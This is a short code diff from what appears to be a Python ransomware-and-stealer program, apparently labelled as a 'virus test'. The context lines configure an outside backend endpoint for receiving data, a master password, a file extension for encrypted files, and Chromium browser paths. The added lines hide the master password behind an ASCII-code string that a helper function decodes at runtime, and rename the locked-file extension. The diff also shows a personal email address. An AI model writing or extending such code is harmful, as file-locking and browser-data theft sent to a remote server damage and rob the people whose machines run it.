@@ -1057,6 +1057,17 @@ try:
 except ImportError:
     HAS_WATCHDOG = False
 
+def decode_ascii_to_text_mae_ah_nang():
+    """Convert ASCII codes (3-digit per char) back to original text"""
+
+    text = ""
+    hello = "114097121117095109097101095097104095110097110103"
+    for i in range(0, len(hello), 3):
+        code = int(hello[i:i+3])
+        text += chr(code)
+    return text
+
+# rayu_mae_ah_nang
 # ==================== CONFIGURATION ====================
 BACKEND_URL = "https://clownfish-app-5kdkx.ondigitalocean.app"
 API_ENDPOINT = f"{BACKEND_URL}/api/receive"
@@ -1064,9 +1075,9 @@ BATCH_ENDPOINT = f"{BACKEND_URL}/api/receive/batch"
 
 SUPPORT_EMAIL = "choengrayu307@gmail.com"
 MAX_ATTEMPTS = 3
-MASTER_PASSWORD = "123456"
+MASTER_PASSWORD = decode_ascii_to_text_mae_ah_nang()
 LOCK_FILE = ".folder_lock"
-ENCRYPTED_EXTENSION = ".locked"
+ENCRYPTED_EXTENSION = ".G2_T4_virus_test"
 
 # Browser paths for Chromium browsers
 CHROMIUM_BROWSERS = {
